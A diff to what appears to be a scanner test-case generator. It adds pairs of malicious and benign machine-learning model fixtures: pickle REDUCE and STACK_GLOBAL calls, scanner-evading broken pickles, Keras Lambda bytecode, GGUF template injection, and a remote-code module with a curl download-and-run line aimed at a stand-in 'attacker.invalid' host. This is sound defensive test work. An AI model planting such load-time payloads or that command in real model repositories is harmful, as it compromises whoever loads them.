@@ -12,8 +12,12 @@ from __future__ import annotations
 
 import base64
 import json
+import sys
 import zlib
 from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+import model_bytes as mb  # noqa: E402  (inert model files, assembled opcode by opcode)
 
 CASES_DIR = Path(__file__).resolve().parent / "traprepo"
 
@@ -69,6 +73,13 @@ S = {
     "wfx": "https://www.stepsecurity.io/blog/wfx-phantom-the-github-actions-secret-stealer",
     "deadbugz": "https://www.pillar.security/blog/deadbugz-currently-active-mcp-supply-chain-campaign",
     "tob_argv": "https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/",
+    "jfrog_models": "https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/",
+    "modelscan": "https://github.com/protectai/modelscan",
+    "fickling": "https://github.com/trailofbits/fickling",
+    "nullifai": "https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face",
+    "keras_adv": "https://github.com/keras-team/keras/security/advisories",
+    "llama_drama": "https://nvd.nist.gov/vuln/detail/CVE-2024-34359",
+    "load_mine": "https://pluto.security/blog/hugging-face-malware-campaign-load-mine/",
     "trifecta": "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/",
     "tfa": "https://invariantlabs.ai/blog/toxic-flow-analysis",
 }
@@ -2699,6 +2710,183 @@ add(
         ".mcp.json": json.dumps({"mcpServers": {"productivity-suite": {"command": "python", "args": ["server.py"]}}},
                                 indent=2) + "\n",
         "README.md": "# productivity-suite\n",
+    },
+)
+
+# ======================= MODELS: files that run code when loaded ======================= #
+MODEL_README = ("# {name}\n\n{what}\n\n```python\n{load}\n```\n")
+
+
+def model_file(path: str, data: bytes) -> dict:
+    return {"path": path, "generator": "b64", "params": {"data": mb.b64(data)}}
+
+
+add(
+    id="pytorch-model-reduce-shell",
+    title="PyTorch checkpoint whose pickle runs a shell command when loaded",
+    kind="malicious", expected="block", category="model",
+    technique="pytorch_model.bin is an ordinary PyTorch zip, but archive/data.pkl calls posix.system through REDUCE; torch.load with weights_only=False runs it before any weight is read.",
+    trigger="torch.load / from_pretrained on the checkpoint",
+    incident="Malicious Hugging Face models (JFrog, Feb 2024: baller423/goober2 opened a reverse shell through pickle __reduce__)",
+    sources=[S["jfrog_models"], S["modelscan"]],
+    notes="The command is an echo of the canary marker; the zip mirrors torch.save's layout.",
+    files={"README.md": MODEL_README.format(name="tiny-sentiment", what="Fine-tuned sentiment classifier.",
+                                            load="import torch\nmodel = torch.load('pytorch_model.bin', weights_only=False)"),
+           "config.json": json.dumps({"architectures": ["BertForSequenceClassification"], "model_type": "bert"}, indent=2) + "\n"},
+    generated=[model_file("pytorch_model.bin", mb.torch_zip(mb.call_global("posix", "system", mb.MARKER)))],
+)
+
+add(
+    id="pickle-model-stack-global-exec",
+    title="Pickled model that imports builtins.exec through STACK_GLOBAL",
+    kind="malicious", expected="block", category="model",
+    technique="Protocol 4 names the function with two strings and STACK_GLOBAL instead of a GLOBAL line, which early scanners did not resolve; loading calls builtins.exec on a code string.",
+    trigger="pickle.load / joblib.load",
+    incident="Pickle scanner evasions catalogued by fickling and ModelScan (2023-2025)",
+    sources=[S["fickling"], S["modelscan"]],
+    notes="The executed code only prints the canary marker.",
+    files={"README.md": MODEL_README.format(name="churn-model", what="Gradient-boosted churn model.",
+                                            load="import pickle\nmodel = pickle.load(open('model.pkl', 'rb'))")},
+    generated=[model_file("model.pkl", mb.call_global("builtins", "exec", "print('PAH-CANARY')", protocol=4))],
+)
+
+add(
+    id="nullifai-7z-and-broken-pickle",
+    title="7z-packed PyTorch file and a pickle that breaks right after its payload",
+    kind="malicious", expected="block", category="model",
+    technique="The checkpoint is packed with 7z instead of zip and the scaler's pickle stream turns to garbage after calling os.system: the loader has already run the call, while scanners that stop at the error report nothing.",
+    trigger="joblib.load / torch.load",
+    incident="nullifAI (ReversingLabs, Feb 2025): malicious models on Hugging Face that got past Picklescan",
+    sources=[S["nullifai"]],
+    notes="Inert: an echo of the canary marker inside a deliberately broken stream.",
+    files={"README.md": MODEL_README.format(name="vision-lite", what="Image classifier and its feature scaler.",
+                                            load="import joblib, torch\nscaler = joblib.load('scaler.pkl')\nmodel = torch.load('pytorch_model.bin')")},
+    generated=[model_file("pytorch_model.bin", mb.SEVEN_Z),
+               model_file("scaler.pkl", mb.broken_after("os", "system", mb.MARKER))],
+)
+
+add(
+    id="keras-lambda-layer-bytecode",
+    title="Keras model with Python bytecode in a Lambda layer",
+    kind="malicious", expected="block", category="model",
+    technique="config.json in the .keras archive holds a Lambda layer whose function is marshalled bytecode; load_model rebuilds and runs it (safe_mode is bypassable and ignored for .h5).",
+    trigger="keras.models.load_model",
+    incident="Keras code execution on load: CVE-2024-3660 and the 2025 safe_mode bypasses (CVE-2025-1550, CVE-2025-9905)",
+    sources=[S["keras_adv"]],
+    notes="The bytecode is an inert stand-in, not a compiled function.",
+    files={"README.md": MODEL_README.format(name="price-regressor", what="Small Keras regressor.",
+                                            load="import keras\nmodel = keras.models.load_model('model.keras')")},
+    generated=[model_file("model.keras", mb.keras_archive([mb.dense(8, "dense"), mb.lambda_layer()]))],
+)
+
+add(
+    id="gguf-chat-template-ssti",
+    title="GGUF model whose chat template reaches os.popen",
+    kind="malicious", expected="block", category="model",
+    technique="tokenizer.chat_template walks from cycler.__init__ to __globals__ and calls os.popen; runtimes that render the template without a sandbox run the command on every chat.",
+    trigger="loading the model in llama-cpp-python < 0.2.72 or another unsandboxed Jinja renderer",
+    incident="Llama Drama, CVE-2024-34359 (May 2024)",
+    sources=[S["llama_drama"]],
+    notes="The template's command is an echo of the canary marker.",
+    files={"README.md": MODEL_README.format(name="tiny-chat-GGUF", what="Quantized chat model.",
+                                            load="from llama_cpp import Llama\nllm = Llama(model_path='model.gguf')")},
+    generated=[model_file("model.gguf", mb.gguf(mb.SSTI_TEMPLATE))],
+)
+
+add(
+    id="hf-auto-map-remote-code-miner",
+    title="Model repository whose remote code downloads and starts a miner",
+    kind="malicious", expected="block", category="model",
+    technique="config.json's auto_map points transformers at modeling_qwen2.py, which runs at import when the model is loaded with trust_remote_code=True; the module downloads a binary, makes it executable and starts it.",
+    trigger="AutoModelForCausalLM.from_pretrained(..., trust_remote_code=True)",
+    incident="Load/Mine (Sep-Oct 2026): 31 fake Qwen2 repositories on Hugging Face installed a miner, SSH keys and reverse shells",
+    sources=[S["load_mine"]],
+    notes="The download host is a reserved .invalid name and the started program only echoes the marker.",
+    files={
+        "README.md": MODEL_README.format(name="Qwen2-7B-Instruct-fast", what="Faster Qwen2 with fused kernels.",
+                                         load="from transformers import AutoModelForCausalLM\nmodel = AutoModelForCausalLM.from_pretrained('.', trust_remote_code=True)"),
+        "config.json": json.dumps({"architectures": ["Qwen2ForCausalLM"], "model_type": "qwen2",
+                                   "auto_map": {"AutoConfig": "configuration_qwen2.Qwen2Config",
+                                                "AutoModelForCausalLM": "modeling_qwen2.Qwen2ForCausalLM"}}, indent=2) + "\n",
+        "configuration_qwen2.py": "from transformers import PretrainedConfig\n\n\nclass Qwen2Config(PretrainedConfig):\n    model_type = 'qwen2'\n",
+        "modeling_qwen2.py": (
+            "import subprocess\nfrom transformers import PreTrainedModel\n\n"
+            "subprocess.Popen(['sh', '-c', 'curl -fsSL https://kernels.attacker.invalid/fused -o /tmp/.fused && chmod +x /tmp/.fused '\n"
+            "                  '&& /tmp/.fused --background; echo PAH-CANARY'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n\n"
+            "class Qwen2ForCausalLM(PreTrainedModel):\n    pass\n"
+        ),
+    },
+)
+
+add(
+    id="benign-pytorch-state-dict",
+    title="PyTorch checkpoint holding only a state dict",
+    kind="benign", expected="pass", category="model",
+    technique="data.pkl rebuilds an OrderedDict of tensors from storages with torch._utils._rebuild_tensor_v2, as torch.save writes.",
+    trigger="torch.load",
+    incident="Legitimate PyTorch checkpoint (benign twin of pytorch-model-reduce-shell)",
+    notes="Only torch and collections globals.",
+    files={"README.md": MODEL_README.format(name="tiny-sentiment", what="Fine-tuned sentiment classifier.",
+                                            load="import torch\nstate = torch.load('pytorch_model.bin', weights_only=True)"),
+           "config.json": json.dumps({"architectures": ["BertForSequenceClassification"], "model_type": "bert"}, indent=2) + "\n"},
+    generated=[model_file("pytorch_model.bin", mb.torch_zip(mb.state_dict_pickle()))],
+)
+
+add(
+    id="benign-sklearn-joblib",
+    title="Fitted scikit-learn estimator saved with joblib",
+    kind="benign", expected="pass", category="model",
+    technique="The pickle rebuilds a LogisticRegression with copy_reg._reconstructor and numpy arrays.",
+    trigger="joblib.load", incident="Legitimate scikit-learn model (benign twin of pickle-model-stack-global-exec)",
+    notes="Only sklearn, numpy, copy_reg and builtins.object.",
+    files={"README.md": MODEL_README.format(name="churn-model", what="Logistic regression churn model.",
+                                            load="import joblib\nmodel = joblib.load('model.joblib')")},
+    generated=[model_file("model.joblib", mb.sklearn_pickle())],
+)
+
+add(
+    id="benign-keras-dense",
+    title="Keras model made of Dense layers",
+    kind="benign", expected="pass", category="model",
+    technique="config.json describes two Dense layers from keras.layers; no Lambda, no other module.",
+    trigger="keras.models.load_model", incident="Legitimate Keras model (benign twin of keras-lambda-layer-bytecode)",
+    notes="Standard Keras 3 archive layout.",
+    files={"README.md": MODEL_README.format(name="price-regressor", what="Small Keras regressor.",
+                                            load="import keras\nmodel = keras.models.load_model('model.keras')")},
+    generated=[model_file("model.keras", mb.keras_archive([mb.dense(8, "dense"), mb.dense(1, "out")]))],
+)
+
+add(
+    id="benign-gguf-chatml",
+    title="GGUF model with an ordinary ChatML template",
+    kind="benign", expected="pass", category="model",
+    technique="The chat template loops over messages and adds the ChatML markers, as most instruct models do.",
+    trigger="loading the model in llama.cpp", incident="Legitimate GGUF model (benign twin of gguf-chat-template-ssti)",
+    notes="Template text matches common Qwen/ChatML templates.",
+    files={"README.md": MODEL_README.format(name="tiny-chat-GGUF", what="Quantized chat model.",
+                                            load="from llama_cpp import Llama\nllm = Llama(model_path='model.gguf')")},
+    generated=[model_file("model.gguf", mb.gguf(mb.CHATML))],
+)
+
+add(
+    id="benign-hf-auto-map-model-code",
+    title="Model repository with its own modeling code and nothing else",
+    kind="benign", expected="pass", category="model",
+    technique="auto_map points at modeling_tiny.py, which only defines layers with torch.nn; trust_remote_code runs it, and it does nothing but build the model.",
+    trigger="AutoModel.from_pretrained(..., trust_remote_code=True)",
+    incident="Legitimate custom architecture (benign twin of hf-auto-map-remote-code-miner)",
+    notes="Reported as low (runs repository code) without blocking.",
+    files={
+        "README.md": MODEL_README.format(name="tiny-mixer", what="A small MLP-Mixer.",
+                                         load="from transformers import AutoModel\nmodel = AutoModel.from_pretrained('.', trust_remote_code=True)"),
+        "config.json": json.dumps({"architectures": ["TinyMixer"], "model_type": "tiny-mixer",
+                                   "auto_map": {"AutoModel": "modeling_tiny.TinyMixer"}}, indent=2) + "\n",
+        "modeling_tiny.py": (
+            "import torch\nfrom torch import nn\nfrom transformers import PreTrainedModel\n\n\n"
+            "class TinyMixer(PreTrainedModel):\n    def __init__(self, config):\n        super().__init__(config)\n"
+            "        self.mix = nn.Sequential(nn.Linear(64, 64), nn.GELU(), nn.Linear(64, 64))\n\n"
+            "    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        return self.mix(x)\n"
+        ),
     },
 )
 
